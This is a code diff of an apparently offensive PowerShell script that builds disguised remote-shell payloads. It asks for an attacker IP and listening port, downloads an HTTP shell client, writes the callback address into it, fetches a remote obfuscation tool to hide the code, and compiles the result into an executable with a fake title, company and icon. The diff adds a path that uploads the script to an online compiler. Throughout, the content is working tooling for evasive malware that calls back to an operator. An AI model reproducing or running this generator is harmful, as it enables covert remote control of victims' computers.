@@ -143,13 +143,13 @@ if(!$readip) { [Console]::SetCursorPosition(0,"$cursortop") ; & $Question ; Writ
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
 $Random = New-Object System.Random ; "Now, the listening port:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $port = $Host.UI.ReadLine() ; if(!$port) { [Console]::SetCursorPosition(0,"$cursortop")
-& $Question ; Write-Host "Now, the listening port:` " -ForegroundColor Gray -NoNewLine ; Write-Host "80" -ForegroundColor Green ; $port = "80" }
+& $Question ; Write-Host "Now, the listening port:` " -ForegroundColor Gray -NoNewLine ; Write-Host "80" -ForegroundColor Green ; [string]$port = "80" }
 
 # Enable Sleep
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
 $Random = New-Object System.Random ; "Enter sleep time in seconds [0-600]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $sleepon = $Host.UI.ReadLine() ; if(!$sleepon) { [Console]::SetCursorPosition(0,"$cursortop")
-& $Question ; Write-Host "Enter sleep time in seconds [0-600]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "10" -ForegroundColor Green ; $sleepon = 60 }
+& $Question ; Write-Host "Enter sleep time in seconds [0-600]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "10" -ForegroundColor Green ; [string]$sleepon = "10" }
 
 # Download HTTP-Client.ps1 & add content
 Write-Host ; Write-Host "[+] Downloading last version of HTTP-Shell.. " -ForegroundColor Blue -NoNewLine
@@ -170,23 +170,35 @@ if($AppName -in 'WINWORD','EXCEL','OUTLOOK') {
 
 # Add config to script
 $ScriptA = "function HTTP-Client {"
-$ScriptB = "} HTTP-Client -c $ip`:`$port -s $sleepon"
+$ScriptB = "} HTTP-Client -c $ip`:$port -s $sleepon"
 $Content = Get-Content $ScriptPath ; Set-Content $ScriptPath -value $ScriptA`n, $Content, $ScriptB`n
 
 # Download Invoke-Stealth & Obfuscate Code
 Write-Host ; Write-Host "[+] Downloading last version of Invoke-Stealth.. " -ForegroundColor Blue -NoNewLine
 Invoke-WebRequest -UseBasicParsing https://darkbyte.net/invoke-stealth.php -outfile $InvokeStealthPath
-Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-& $InvokeStealthPath $ScriptPath -technique all -nobanner
+Write-Host "[OK]`n" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
+& $InvokeStealthPath $ScriptPath -technique reverseb64,psobfuscation -nobanner
 
 # Download PS2exe & Compile EXE file
-Write-Host "[+] Downloading PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$PS2exePath")
 if ($OSVersion -like 'Unix') { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -AsByteStream } else { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte }
 if ($OSVersion -like 'Unix') { (Get-Content $PS2exePath).Replace("powershell","pwsh") | Set-Content $PS2exePath ; (Get-Content $PS2exePath).Replace("PowerShell","pwsh") | Set-Content $PS2exePath }
-Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
 
+if ($OSVersion -like 'Unix') { $response = Invoke-WebRequest -UseBasicParsing "https://ps2exe.azurewebsites.net/"
+$viewStateMatch = [regex]::Match($response.Content, '(?<=__VIEWSTATE" value=")(.*?)(?=")')
+$eventValidationMatch = [regex]::Match($response.Content, '(?<=__EVENTVALIDATION" value=")(.*?)(?=")')
+$viewState = [System.Uri]::EscapeDataString("$viewStateMatch")
+$eventValidation = [System.Uri]::EscapeDataString("$eventValidationMatch")
+
+$ScriptFile = Get-Content $ScriptPath
+$Script2Send = [System.Uri]::EscapeDataString("$ScriptFile")
+$body = [System.String]::new("__EVENTTARGET=ctl00%24ContentPlaceHolder1%24bt_Compile&__VIEWSTATE=$viewState&__EVENTVALIDATION=$eventValidation&ctl00%24ContentPlaceHolder1%24tb_PSSCript=$Script2Send&ctl00%24ContentPlaceHolder1%24tb_Filename=Payload.exe")
+Write-Host "[+] Uploading to PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
+$postfile = Invoke-WebRequest -Method POST -Uri "https://ps2exe.azurewebsites.net" -Body $body -OutFile "$OutfilePath" -PassThru }
+
+else { Write-Host "[+] Downloading PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
+Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noOutput -noVisualStyles -noConsole -noError 2>&1> $null }
+Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
 # Repeat operation
